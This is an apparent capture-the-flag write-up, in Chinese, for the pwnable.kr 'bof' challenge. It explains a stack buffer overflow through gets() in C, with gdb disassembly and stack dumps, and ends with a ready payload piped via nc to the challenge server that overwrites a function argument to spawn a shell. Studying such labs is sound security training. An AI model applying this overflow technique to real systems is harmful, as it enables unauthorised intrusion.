## Source code
```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```

## Pwn
從 `gets()` 這邊看起來，我們有機會使用 buffer overflow

進 gdb 調試
```
$ gdb ./bof
(gdb) info func # 列出所以 function symbols
(gdb) disas func # disassemble func()
```

*func+40 的地方就是 `if (key == 0xcafebabe)`，意即 key 這個 function param 存放在 ebp+0x8，即x86 (32bit)上存放第一個 function param 的地方
```
0x0000064f <+35>:    call   0x650 <func+36>
0x00000654 <+40>:    cmp    DWORD PTR [ebp+0x8],0xcafebabe
0x0000065b <+47>:    jne    0x66b <func+63>
```

在 *func+40 處設定 breakpoint，然後把程式跑起來。隨便輸入幾個 A 進去
```
(gdb) b *func+40
(gdb) r
Starting program: /mnt/external/Code/ctf-playground/pwnable.kr/03-bof/bof
overflow me :
AAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

通常 local varaibles 存放在 $ebp - n 的地方，往回看確實可以找到我們的buffer（很多0x41就是我們剛剛塞的）。後面那個0xdeadbeef就是我們要overwrite的部分。
```
(gdb) x/28x $ebp-60
0xffffc5bc:     0xf7dcd349      0xf7ffcfb8      0x00000000      0x00000000
0xffffc5cc:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffc5dc:     0x41414141      0x41414141      0x41414141      0x56550041
0xffffc5ec:     0xbfad3200      0xf7fe43f0      0x00000000      0xffffc618
0xffffc5fc:     0x5655569f      0xdeadbeef      0x00000001      0x565556b9
0xffffc60c:     0x00000000      0xf7f96000      0xf7f96000      0x00000000
0xffffc61c:     0xf7dcd991      0x00000001      0xffffc6b4      0xffffc6bc
```

打造payload，記得 `0xcafebabe` 要用 little endian 表示。
```
(python2 -c 'print 13 * "AAAA" + "\xbe\xba\xfe\xca"' && cat) | nc pwnable.kr 9000
```
